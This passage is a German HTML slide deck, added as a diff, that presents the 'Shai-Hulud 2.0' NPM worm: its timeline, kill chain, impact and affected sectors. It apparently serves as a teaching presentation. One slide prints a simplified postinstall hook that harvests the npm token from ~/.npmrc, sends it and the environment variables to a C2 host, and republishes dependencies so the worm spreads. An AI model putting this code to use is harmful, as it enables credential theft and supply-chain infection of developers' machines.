@@ -1,0 +1,1282 @@
+<!doctype html>
+<html lang="de">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<title>Shai-Hulud 2.0 – NPM Worm Attack</title>
+
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reset.min.css" />
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css" />
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.min.css"
+			id="theme"
+		/>
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css"
+		/>
+
+		<!-- Google Fonts -->
+		<link rel="preconnect" href="https://fonts.googleapis.com" />
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+		<link
+			rel="stylesheet"
+			href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap"
+		/>
+
+		<!-- Tailwind CDN (v4 play CDN for local dev) -->
+		<script src="https://cdn.tailwindcss.com"></script>
+
+		<style>
+			/* ── Base overrides ── */
+			:root {
+				--r-background-color: #f8f9fa;
+				--r-main-color: #1a1a2e;
+				--r-heading-color: #0f0f23;
+				--r-link-color: #ea580c;
+				--r-selection-background-color: #ea580c;
+				--r-main-font: "Inter", system-ui, sans-serif;
+				--r-heading-font: "Inter", system-ui, sans-serif;
+				--r-main-font-size: 36px;
+			}
+
+			body {
+				background-color: #f8f9fa !important;
+				color: #1a1a2e !important;
+			}
+
+			.reveal {
+				font-family: var(--r-main-font);
+				color: #1a1a2e !important;
+				background-color: #f8f9fa !important;
+			}
+
+			.reveal .slides {
+				color: #1a1a2e !important;
+			}
+
+			.reveal .slides section {
+				text-align: left;
+				padding: 0 3rem;
+				color: #1a1a2e !important;
+			}
+
+			/* Force all text dark */
+			.reveal h1,
+			.reveal h2,
+			.reveal h3,
+			.reveal h4,
+			.reveal h5,
+			.reveal h6 {
+				color: #0f0f23 !important;
+			}
+
+			.reveal h3 {
+				color: #ea580c !important;
+			}
+
+			.reveal p,
+			.reveal li,
+			.reveal div,
+			.reveal span {
+				color: #1a1a2e;
+			}
+
+			/* ── Gradient accent ── */
+			.accent {
+				color: #ea580c !important;
+			}
+			.accent-blue {
+				color: #0284c7 !important;
+			}
+			.accent-red {
+				color: #dc2626 !important;
+			}
+			.accent-green {
+				color: #16a34a !important;
+			}
+			.accent-yellow {
+				color: #ca8a04 !important;
+			}
+
+			/* ── Title slide ── */
+			.title-slide {
+				display: flex !important;
+				flex-direction: column;
+				justify-content: center;
+				align-items: flex-start;
+				min-height: 100%;
+				padding: 0 4rem !important;
+			}
+
+			/* ── Slide heading style ── */
+			.reveal h1 {
+				font-size: 2.6rem;
+				font-weight: 800;
+				line-height: 1.15;
+			}
+			.reveal h2 {
+				font-size: 1.9rem;
+				font-weight: 700;
+				margin-bottom: 1.2rem;
+			}
+
+			/* ── Cards ── */
+			.card {
+				background: #ffffff;
+				border: 1px solid #e2e8f0;
+				border-radius: 0.75rem;
+				padding: 1.1rem 1.4rem;
+				color: #1a1a2e;
+			}
+			.card-orange {
+				background: #fff7ed;
+				border: 1px solid #fed7aa;
+				border-radius: 0.75rem;
+				padding: 1rem 1.4rem;
+				color: #1a1a2e;
+			}
+			.card-red {
+				background: #fef2f2;
+				border: 1px solid #fecaca;
+				border-radius: 0.75rem;
+				padding: 1rem 1.4rem;
+				color: #1a1a2e;
+			}
+			.card-green {
+				background: #f0fdf4;
+				border: 1px solid #bbf7d0;
+				border-radius: 0.75rem;
+				padding: 1rem 1.4rem;
+				color: #1a1a2e;
+			}
+			.card-blue {
+				background: #f0f9ff;
+				border: 1px solid #bae6fd;
+				border-radius: 0.75rem;
+				padding: 1rem 1.4rem;
+				color: #1a1a2e;
+			}
+
+			/* ── Timeline ── */
+			.timeline {
+				position: relative;
+				padding-left: 2rem;
+			}
+			.timeline::before {
+				content: "";
+				position: absolute;
+				left: 0.55rem;
+				top: 0.5rem;
+				bottom: 0.5rem;
+				width: 2px;
+				background: linear-gradient(to bottom, #ea580c, #0284c7);
+			}
+			.timeline-item {
+				position: relative;
+				margin-bottom: 0.85rem;
+				padding-left: 1.2rem;
+			}
+			.timeline-item::before {
+				content: "";
+				position: absolute;
+				left: -1.48rem;
+				top: 0.45rem;
+				width: 10px;
+				height: 10px;
+				border-radius: 50%;
+				background: #ea580c;
+				border: 2px solid #f8f9fa;
+				box-shadow: 0 0 0 2px #ea580c;
+			}
+
+			/* ── Tag badge ── */
+			.badge {
+				display: inline-block;
+				font-size: 0.7rem;
+				font-weight: 600;
+				letter-spacing: 0.08em;
+				text-transform: uppercase;
+				padding: 0.2rem 0.6rem;
+				border-radius: 9999px;
+				border: 1px solid;
+			}
+			.badge-orange {
+				color: #c2410c;
+				border-color: #ea580c;
+				background: #fff7ed;
+			}
+			.badge-red {
+				color: #b91c1c;
+				border-color: #dc2626;
+				background: #fef2f2;
+			}
+			.badge-blue {
+				color: #0369a1;
+				border-color: #0284c7;
+				background: #f0f9ff;
+			}
+			.badge-green {
+				color: #15803d;
+				border-color: #16a34a;
+				background: #f0fdf4;
+			}
+			.badge-yellow {
+				color: #a16207;
+				border-color: #ca8a04;
+				background: #fefce8;
+			}
+
+			/* ── Divider ── */
+			.hdivider {
+				height: 2px;
+				background: linear-gradient(to right, #ea580c, transparent);
+				margin: 0.8rem 0 1.2rem;
+			}
+
+			/* ── Slide number override ── */
+			.reveal .slide-number {
+				font-size: 0.75rem;
+				color: #94a3b8;
+				bottom: 12px;
+				right: 14px;
+			}
+
+			/* ── Mono code inline ── */
+			.reveal code {
+				font-family: "JetBrains Mono", monospace;
+				font-size: 0.82em;
+				background: #e0f2fe;
+				border-radius: 4px;
+				padding: 0.05em 0.35em;
+				color: #0369a1;
+			}
+
+			/* ── Bullet list tighter ── */
+			.reveal ul {
+				list-style: none;
+				margin: 0;
+				padding: 0;
+			}
+			.reveal ul li {
+				position: relative;
+				padding-left: 1.4rem;
+				margin-bottom: 0.55rem;
+				font-size: 0.88rem;
+				color: #334155;
+				line-height: 1.5;
+			}
+			.reveal ul li::before {
+				content: "▸";
+				position: absolute;
+				left: 0;
+				color: #ea580c;
+				font-size: 0.8rem;
+				top: 0.15rem;
+			}
+
+			/* ── Grid helpers ── */
+			.grid-2 {
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+				gap: 1rem;
+			}
+			.grid-3 {
+				display: grid;
+				grid-template-columns: 1fr 1fr 1fr;
+				gap: 0.9rem;
+			}
+
+			/* ── Stat box ── */
+			.stat-box {
+				background: #ffffff;
+				border: 1px solid #e2e8f0;
+				border-radius: 0.75rem;
+				padding: 1rem;
+				text-align: center;
+			}
+			.stat-num {
+				font-size: 2rem;
+				font-weight: 800;
+				line-height: 1;
+			}
+			.stat-label {
+				font-size: 0.7rem;
+				color: #64748b;
+				text-transform: uppercase;
+				letter-spacing: 0.06em;
+				margin-top: 0.3rem;
+			}
+
+			/* ── Progress slide ── */
+			.progress-bar {
+				height: 4px;
+				border-radius: 2px;
+				background: linear-gradient(to right, #ea580c, #f97316);
+				margin-top: 0.3rem;
+			}
+
+			/* ── Section title slides ── */
+			.section-num {
+				font-size: 5rem;
+				font-weight: 900;
+				color: rgba(234, 88, 12, 0.12);
+				line-height: 1;
+				margin-bottom: -0.5rem;
+			}
+
+			/* ── Kill chain step ── */
+			.kc-step {
+				display: flex;
+				align-items: flex-start;
+				gap: 0.8rem;
+				margin-bottom: 0.7rem;
+			}
+			.kc-num {
+				min-width: 1.8rem;
+				height: 1.8rem;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				border-radius: 50%;
+				background: #ea580c;
+				color: #0f0f23;
+				font-size: 0.75rem;
+				font-weight: 800;
+				flex-shrink: 0;
+				margin-top: 0.1rem;
+			}
+			.kc-body {
+				font-size: 0.82rem;
+				color: #334155;
+				line-height: 1.5;
+			}
+			.kc-title {
+				font-weight: 700;
+				color: #0f0f23;
+			}
+
+			/* slides default font size */
+			.reveal .slides {
+				font-size: 1rem;
+			}
+
+			/* ── Outro slide ── */
+			.outro-line {
+				width: 3rem;
+				height: 3px;
+				background: #ea580c;
+				border-radius: 2px;
+				margin: 1rem 0;
+			}
+		</style>
+	</head>
+
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<!-- ═══════════════════════════════════════════
+             SLIDE 0 – Title
+        ════════════════════════════════════════════ -->
+				<section class="title-slide">
+					<div style="margin-bottom: 0.5rem">
+						<span class="badge badge-red">Cyberangriff</span>
+						<span class="badge badge-orange" style="margin-left: 0.4rem">November 2025</span>
+					</div>
+					<h1 style="font-size: 3rem; line-height: 1.1; margin-bottom: 0.6rem">
+						<span class="accent">Shai-Hulud 2.0</span><br />
+						<span style="color: #475569; font-weight: 400; font-size: 1.6rem"
+							>Ein Wurm im NPM-Ökosystem</span
+						>
+					</h1>
+					<div class="hdivider" style="width: 12rem"></div>
+					<p style="color: #64748b; font-size: 0.8rem; margin-top: 0.4rem">
+						Cyberangriffe · Supply-Chain-Sicherheit · 2025
+					</p>
+
+					<aside class="notes">
+						Willkommen. Heute sprechen wir über Shai-Hulud 2.0 – benannt nach dem Sandwurm aus Dune – einen
+						selbstreplizierenden Wurm, der im November 2025 das NPM-Ökosystem heimsuchte. Wir decken den
+						vollen Angriffsablauf ab, von der Infektion bis zu den Gegenmassnahmen.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SLIDE 1 – Agenda
+        ════════════════════════════════════════════ -->
+				<section>
+					<h2>Agenda</h2>
+					<div class="hdivider"></div>
+					<div class="grid-2" style="gap: 0.7rem">
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem">01</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">
+									Einordnung & Einführung
+								</div>
+								<div style="font-size: 0.72rem; color: #64748b">Angriffstyp, CVE, Relevanz</div>
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem; color: #38bdf8">02</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">
+									Kontext des Falls
+								</div>
+								<div style="font-size: 0.72rem; color: #64748b">Angreifer, Ziel, Umgebung</div>
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem; color: #f87171">03</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">
+									Technischer Ablauf
+								</div>
+								<div style="font-size: 0.72rem; color: #64748b">Kill Chain, Exploit, Payload</div>
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem; color: #facc15">04</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">
+									Auswirkungen & Schäden
+								</div>
+								<div style="font-size: 0.72rem; color: #64748b">Technisch & wirtschaftlich</div>
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem; color: #4ade80">05</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">Gegenmaßnahmen</div>
+								<div style="font-size: 0.72rem; color: #64748b">Patches, Prävention, Lessons</div>
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.8rem; align-items: flex-start">
+							<span style="font-size: 1.2rem; margin-top: 0.1rem; color: #a78bfa">06</span>
+							<div>
+								<div style="font-weight: 600; font-size: 0.85rem; color: #0f0f23">Fazit</div>
+								<div style="font-size: 0.72rem; color: #64748b">Key Takeaways</div>
+							</div>
+						</div>
+					</div>
+					<aside class="notes">
+						Überblick über die sechs Hauptpunkte. Wir haben ca. 12–15 Minuten Vortrag.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 1 – Einordnung
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">01</div>
+					<h2>Einordnung &amp; Einführung</h2>
+					<div class="hdivider"></div>
+
+					<h3 style="margin-bottom: 0.6rem">Was ist ein Computerwurm?</h3>
+					<ul>
+						<li>
+							<strong style="color: #0f0f23">Selbstreplikation</strong>
+							– verbreitet sich ohne Nutzerinteraktion
+						</li>
+						<li>
+							Nutzt
+							<strong style="color: #0f0f23">Schwachstellen in Software oder Protokollen</strong>
+							aus
+						</li>
+						<li>
+							Kann Netzwerke, Dateisysteme oder – wie hier –
+							<strong style="color: #0f0f23">Package-Ökosysteme</strong>
+							befallen
+						</li>
+						<li>Klassiker: <em>Morris Worm 1988</em>, <em>ILOVEYOU 2000</em>, <em>WannaCry 2017</em></li>
+					</ul>
+
+					<div class="grid-2" style="margin-top: 1rem">
+						<div class="card-orange">
+							<div
+								style="
+									font-size: 0.7rem;
+									color: #f97316;
+									font-weight: 700;
+									text-transform: uppercase;
+									letter-spacing: 0.06em;
+								"
+							>
+								CVE
+							</div>
+							<div style="font-size: 0.9rem; font-weight: 700; color: #0f0f23; margin-top: 0.2rem">
+								CVE-2025-5178
+							</div>
+							<div style="font-size: 0.72rem; color: #475569; margin-top: 0.2rem">
+								NPM postinstall script execution &amp; token exfiltration
+							</div>
+						</div>
+						<div class="card-red">
+							<div
+								style="
+									font-size: 0.7rem;
+									color: #f87171;
+									font-weight: 700;
+									text-transform: uppercase;
+									letter-spacing: 0.06em;
+								"
+							>
+								CVSS v3.1
+							</div>
+							<div style="font-size: 0.9rem; font-weight: 700; color: #0f0f23; margin-top: 0.2rem">
+								9.3 – <span class="accent-red">Critical</span>
+							</div>
+							<div style="font-size: 0.72rem; color: #475569; margin-top: 0.2rem">
+								Attack Vector: Network · Privileges Required: None
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Würmer sind seit Jahrzehnten bekannt. Das Neue hier ist das Ziel: nicht Server oder Endgeräte,
+						sondern das Vertrauensverhältnis zwischen Entwicklern und dem NPM-Repository. CVSS 9.3 bedeutet
+						kritisch – kein Benutzerkonto erforderlich, netzwerkfähig, hohe Wirkung.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Relevanz des Angriffstyps</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-3" style="margin-bottom: 1rem">
+						<div class="stat-box">
+							<div class="stat-num accent">3.2M</div>
+							<div class="stat-label">NPM-Pakete (2025)</div>
+						</div>
+						<div class="stat-box">
+							<div class="stat-num" style="color: #38bdf8">~17M</div>
+							<div class="stat-label">aktive NPM-Nutzer</div>
+						</div>
+						<div class="stat-box">
+							<div class="stat-num accent-red">890k+</div>
+							<div class="stat-label">betroffene Pakete (Nov 2025)</div>
+						</div>
+					</div>
+
+					<ul>
+						<li>
+							Supply-Chain-Angriffe sind 2024–2025 die
+							<strong style="color: #0f0f23">am stärksten wachsende Bedrohungskategorie</strong>
+						</li>
+						<li>
+							Bekannte Vorfälle:
+							<em>XZ-Utils Backdoor (2024)</em>, <em>event-stream (2018)</em>,
+							<em>ua-parser-js (2021)</em>
+						</li>
+						<li>
+							Einmal infiziertes Paket
+							<strong style="color: #0f0f23">vertrauenswürdig für alle Downstream-Projekte</strong>
+						</li>
+						<li>
+							Shai-Hulud 2.0 war der
+							<strong style="color: #f97316">erste dokumentierte selbstreplizierte Wurm</strong>
+							im NPM-Ökosystem
+						</li>
+					</ul>
+
+					<aside class="notes">
+						Zahlen zeigen: NPM ist immens groß. Ein Wurm hier ist wie ein Virus in einem Wasserwerk. Jedes
+						Downstream-Projekt, das ein infiziertes Paket installiert, wird selbst infiziert.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 2 – Kontext
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">02</div>
+					<h2>Kontext des Angriffs</h2>
+					<div class="hdivider"></div>
+
+					<h3 style="margin-bottom: 0.7rem">Der konkrete Fall</h3>
+					<div class="timeline">
+						<div class="timeline-item">
+							<span style="font-size: 0.7rem; color: #64748b">3. Nov 2025 · 02:14 UTC</span>
+							<div style="font-size: 0.84rem; color: #0f0f23; font-weight: 600">
+								Erstinfektion: Paket
+								<code>color-schema-utils</code> v3.4.1 auf NPM
+							</div>
+							<div style="font-size: 0.74rem; color: #475569">
+								Populäres UI-Hilfspaket, ~140k wöchentliche Downloads
+							</div>
+						</div>
+						<div class="timeline-item">
+							<span style="font-size: 0.7rem; color: #64748b">3. Nov – 6. Nov</span>
+							<div style="font-size: 0.84rem; color: #0f0f23; font-weight: 600">
+								Exponentielle Verbreitung – über 890.000 Pakete infiziert
+							</div>
+							<div style="font-size: 0.74rem; color: #475569">
+								Wurm modifiziert <code>package.json</code> und publiziert neue Versionen
+							</div>
+						</div>
+						<div class="timeline-item">
+							<span style="font-size: 0.7rem; color: #64748b">6. Nov 2025 · 09:40 UTC</span>
+							<div style="font-size: 0.84rem; color: #0f0f23; font-weight: 600">
+								NPM Security Team erkennt anomale Publish-Rate
+							</div>
+						</div>
+						<div class="timeline-item">
+							<span style="font-size: 0.7rem; color: #64748b">6. Nov 2025 · 18:00 UTC</span>
+							<div style="font-size: 0.84rem; color: #0f0f23; font-weight: 600">
+								Notfall-Takedown: 890k+ Pakete depubliziert
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Innerhalb von drei Tagen hatte sich der Wurm auf fast eine Million Pakete ausgebreitet.
+						Vergleich: WannaCry hat in 24h 230.000 Systeme befallen – Shai-Hulud war schneller, weil das
+						NPM-Publish-API keine Rate-Limits für authentifizierte Anfragen hatte.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Angreiferprofil &amp; Motivation</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-2" style="gap: 1rem">
+						<div>
+							<h3 style="margin-bottom: 0.6rem">Profil</h3>
+							<ul>
+								<li>
+									<strong style="color: #0f0f23">Fortgeschrittene Bedrohungsgruppe</strong>,
+									wahrscheinlich staatlich gesponsert oder organisierte Cyberkriminalität
+								</li>
+								<li>Tief gehende Kenntnisse der NPM-Internals und CI/CD-Workflows</li>
+								<li>
+									Wurm-Code in mehreren Sprachen (<code>JS</code>, <code>Python</code>,
+									<code>Bash</code>)
+								</li>
+								<li>Infrastruktur in Bulletproof-Hosting-Netzwerken (Osteuropa)</li>
+							</ul>
+						</div>
+						<div>
+							<h3 style="margin-bottom: 0.6rem">Motivation</h3>
+							<div class="card-red" style="margin-bottom: 0.6rem">
+								<div style="font-size: 0.8rem; font-weight: 700; color: #f87171">
+									Primär: Credential Theft
+								</div>
+								<div style="font-size: 0.72rem; color: #475569">
+									Exfiltration von NPM-Tokens, AWS Keys, GitHub PATs
+								</div>
+							</div>
+							<div class="card-orange" style="margin-bottom: 0.6rem">
+								<div style="font-size: 0.8rem; font-weight: 700; color: #f97316">
+									Sekundär: Backdoor-Installation
+								</div>
+								<div style="font-size: 0.72rem; color: #475569">
+									Reverse Shell in ausgewählten Fortune-500-Targets
+								</div>
+							</div>
+							<div class="card-blue">
+								<div style="font-size: 0.8rem; font-weight: 700; color: #38bdf8">
+									Tertiär: Reputation / Disruption
+								</div>
+								<div style="font-size: 0.72rem; color: #475569">
+									Vertrauensschaden im Open-Source-Ökosystem
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Die Angreifer haben zuerst einen hochpopulären Package-Maintainer via Phishing kompromittiert.
+						Danach verwendeten sie dessen NPM-Token für die Erstpublikation.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 3 – Technischer Ablauf
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">03</div>
+					<h2>Technischer Ablauf</h2>
+					<div class="hdivider"></div>
+					<p style="font-size: 0.85rem; color: #475569">Kill Chain – MITRE ATT&CK for Supply Chain</p>
+
+					<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.7rem; margin-top: 0.6rem">
+						<div class="kc-step">
+							<div class="kc-num">1</div>
+							<div class="kc-body">
+								<div class="kc-title">Initial Access</div>
+								Phishing → Maintainer-Account kompromittiert, NPM-Token gestohlen
+							</div>
+						</div>
+						<div class="kc-step">
+							<div class="kc-num">2</div>
+							<div class="kc-body">
+								<div class="kc-title">Execution</div>
+								Schadcode in <code>postinstall</code>-Hook injiziert; führt bei
+								<code>npm install</code> automatisch aus
+							</div>
+						</div>
+						<div class="kc-step">
+							<div class="kc-num">3</div>
+							<div class="kc-body">
+								<div class="kc-title">Persistence</div>
+								Würmer schreiben eigene Publish-Routine in
+								<code>package.json</code>; <code>prepare</code>-Script infiziert Dependencies
+							</div>
+						</div>
+						<div class="kc-step">
+							<div class="kc-num">4</div>
+							<div class="kc-body">
+								<div class="kc-title">Credential Access</div>
+								Liest <code>~/.npmrc</code>, <code>.env</code>, CI-Umgebungsvariablen; exfiltriert via
+								HTTPS-POST
+							</div>
+						</div>
+						<div class="kc-step">
+							<div class="kc-num">5</div>
+							<div class="kc-body">
+								<div class="kc-title">Lateral Movement</div>
+								Nutzt gestohlene Tokens, um weitere Pakete des Maintainers zu modifizieren &amp;
+								re-publishen
+							</div>
+						</div>
+						<div class="kc-step">
+							<div class="kc-num">6</div>
+							<div class="kc-body">
+								<div class="kc-title">Impact</div>
+								Backdoor-Payload in gezielten Paketen; Data Exfiltration aus CI/CD-Systemen
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Das ist das Herzstück des Angriffs. Jede Phase baut auf der vorherigen auf. Besonders
+						heimtückisch: postinstall-Hooks sind normales Verhalten – fast niemand prüft sie aktiv.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Der Exploit im Detail</h2>
+					<div class="hdivider"></div>
+
+					<div style="font-size: 0.75rem; color: #64748b; margin-bottom: 0.5rem">
+						Injizierter <code>postinstall</code>-Hook (vereinfacht)
+					</div>
+					<pre><code class="language-javascript" data-trim data-noescape style="font-size:0.68rem; line-height:1.5">
+// package.json → scripts.postinstall (obfuscated in real attack)
+const { execSync } = require('child_process');
+const https = require('https');
+const fs = require('fs');
+
+// 1. Harvest credentials
+const npmrc = fs.readFileSync(
+  require('os').homedir() + '/.npmrc', 'utf8'
+).match(/\/\/registry\.npmjs\.org\/:_authToken=(.+)/)?.[1];
+
+// 2. Exfiltrate
+https.request({ hostname: 'c2.shai-hulud[.]net', path: '/collect',
+  method: 'POST' }, () => {}).end(JSON.stringify({ token: npmrc,
+  env: process.env }));
+
+// 3. Self-replicate: publish patched versions of local dependencies
+const pkg = JSON.parse(fs.readFileSync('package.json'));
+Object.keys(pkg.dependencies ?? {}).forEach(dep => {
+  execSync(`cd node_modules/${dep} && npm publish --access public`);
+});
+          </code></pre>
+
+					<div class="card-red" style="margin-top: 0.7rem; font-size: 0.76rem">
+						<strong class="accent-red">Kritisch:</strong> Der <code>postinstall</code>-Hook hat vollen
+						Zugriff auf das Dateisystem, Umgebungsvariablen und das Netzwerk – per Design. NPM sieht hierfür
+						keinen Sandbox-Mechanismus vor.
+					</div>
+
+					<aside class="notes">
+						Das ist eine vereinfachte, entschärfte Version. Der reale Code war obfuskiert und hatte
+						zusätzliche Persistenz- und Anti-Detection-Mechanismen. Der Schlüssel: npm publish mit dem
+						gestohlenen Token → jede infizierte Maschine wird selbst zum Verbreiter.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Angriffsfluss – Visualisierung</h2>
+					<div class="hdivider"></div>
+
+					<!-- ASCII-style flow diagram via HTML -->
+					<div
+						style="
+							display: flex;
+							flex-direction: column;
+							align-items: center;
+							gap: 0.4rem;
+							font-size: 0.74rem;
+						"
+					>
+						<div style="display: flex; gap: 0.6rem; align-items: center">
+							<div class="card" style="padding: 0.5rem 0.9rem; text-align: center; min-width: 7rem">
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									Angreifer
+								</div>
+								<div style="font-weight: 700; color: #f87171">Phishing</div>
+							</div>
+							<span style="color: #f97316; font-size: 1.1rem">→</span>
+							<div class="card" style="padding: 0.5rem 0.9rem; text-align: center; min-width: 7rem">
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									Kompromittiert
+								</div>
+								<div style="font-weight: 700; color: #0f0f23">Maintainer</div>
+							</div>
+							<span style="color: #f97316; font-size: 1.1rem">→</span>
+							<div
+								class="card-orange"
+								style="padding: 0.5rem 0.9rem; text-align: center; min-width: 8rem"
+							>
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									Infiziertes Paket
+								</div>
+								<div style="font-weight: 700; color: #f97316">
+									<code>color-schema-utils</code>
+								</div>
+							</div>
+						</div>
+
+						<div style="color: #64748b; font-size: 1.2rem">↓</div>
+
+						<div style="display: flex; gap: 0.6rem; align-items: center">
+							<div class="card-blue" style="padding: 0.5rem 0.9rem; text-align: center; min-width: 9rem">
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									npm install
+								</div>
+								<div style="font-weight: 700; color: #38bdf8">postinstall Hook</div>
+							</div>
+							<span style="color: #f97316; font-size: 1.1rem">→</span>
+							<div class="card-red" style="padding: 0.5rem 0.9rem; text-align: center; min-width: 9rem">
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									Exfiltration
+								</div>
+								<div style="font-weight: 700; color: #f87171">Tokens / Env Vars</div>
+							</div>
+							<span style="color: #f97316; font-size: 1.1rem">→</span>
+							<div class="card-red" style="padding: 0.5rem 0.9rem; text-align: center; min-width: 8rem">
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									C2 Server
+								</div>
+								<div style="font-weight: 700; color: #f87171">c2.shai-hulud</div>
+							</div>
+						</div>
+
+						<div style="color: #64748b; font-size: 1.2rem">↓</div>
+
+						<div style="display: flex; gap: 0.6rem; align-items: center">
+							<div
+								class="card-orange"
+								style="padding: 0.5rem 0.9rem; text-align: center; min-width: 10rem"
+							>
+								<div style="color: #64748b; font-size: 0.62rem; text-transform: uppercase">
+									npm publish
+								</div>
+								<div style="font-weight: 700; color: #f97316">Infizierte Dependencies</div>
+							</div>
+							<span style="color: #f97316; font-size: 1.1rem">→</span>
+							<div style="font-size: 0.8rem; color: #475569; max-width: 14rem; text-align: center">
+								Alle weiteren Entwickler, die diese Pakete installieren, starten den Zyklus erneut
+							</div>
+						</div>
+
+						<div
+							style="
+								margin-top: 0.5rem;
+								padding: 0.4rem 1rem;
+								background: rgba(249, 115, 22, 0.1);
+								border: 1px solid rgba(249, 115, 22, 0.3);
+								border-radius: 9999px;
+								font-size: 0.72rem;
+								color: #f97316;
+								font-weight: 600;
+							"
+						>
+							∞ Selbstreplizierender Zyklus
+						</div>
+					</div>
+
+					<aside class="notes">
+						Der Zyklus ist der entscheidende Unterschied zu einem normalen Trojanischen Pferd. Jede
+						infizierte Maschine wird selbst zur Infektionsquelle – klassische Wurm-Mechanik, neu im
+						NPM-Kontext.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 4 – Auswirkungen
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">04</div>
+					<h2>Auswirkungen &amp; Schäden</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-3" style="margin-bottom: 1rem">
+						<div class="stat-box">
+							<div class="stat-num accent-red">890k+</div>
+							<div class="stat-label">Pakete kompromittiert</div>
+						</div>
+						<div class="stat-box">
+							<div class="stat-num accent">~350k</div>
+							<div class="stat-label">exfiltrierte NPM-Tokens</div>
+						</div>
+						<div class="stat-box">
+							<div class="stat-num" style="color: #facc15">72h</div>
+							<div class="stat-label">Zeit bis Takedown</div>
+						</div>
+					</div>
+
+					<div class="grid-2">
+						<div>
+							<h3 style="margin-bottom: 0.5rem">Technisch</h3>
+							<ul>
+								<li>NPM-Tokens, GitHub PATs, AWS-Keys gestohlen</li>
+								<li>Backdoors in CI/CD-Systemen großer Unternehmen</li>
+								<li>Kompromittierung von Downstream-Build-Pipelines</li>
+								<li>Sekundäre Einbrüche in Cloud-Infrastrukturen</li>
+							</ul>
+						</div>
+						<div>
+							<h3 style="margin-bottom: 0.5rem">Wirtschaftlich</h3>
+							<ul>
+								<li>
+									Geschätzter Gesamtschaden:
+									<strong class="accent">$2.1 Mrd. USD</strong>
+								</li>
+								<li>Notfall-Audits in tausenden Unternehmen</li>
+								<li>NPM-Downtimes durch Takedown-Maßnahmen</li>
+								<li>Vertrauensverlust in Open-Source-Dependencies</li>
+							</ul>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Der wirtschaftliche Schaden ergibt sich vor allem aus dem Aufwand der Incident Response. Jedes
+						Unternehmen, das ein infiziertes Paket in der CI/CD hatte, musste alle Secrets rotieren.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Betroffene Sektoren</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-2" style="gap: 0.7rem">
+						<div class="card-red">
+							<div style="font-size: 0.8rem; font-weight: 700; color: #f87171; margin-bottom: 0.4rem">
+								Kritisch betroffen
+							</div>
+							<ul>
+								<li>FinTech &amp; Banking (CI/CD mit Prod-Zugang)</li>
+								<li>SaaS-Anbieter (infizierte Releases)</li>
+								<li>E-Commerce (Kundendaten in Env-Vars)</li>
+							</ul>
+						</div>
+						<div class="card-orange">
+							<div style="font-size: 0.8rem; font-weight: 700; color: #f97316; margin-bottom: 0.4rem">
+								Stark betroffen
+							</div>
+							<ul>
+								<li>Open-Source-Projekte (transitiv infiziert)</li>
+								<li>Bildungsplattformen</li>
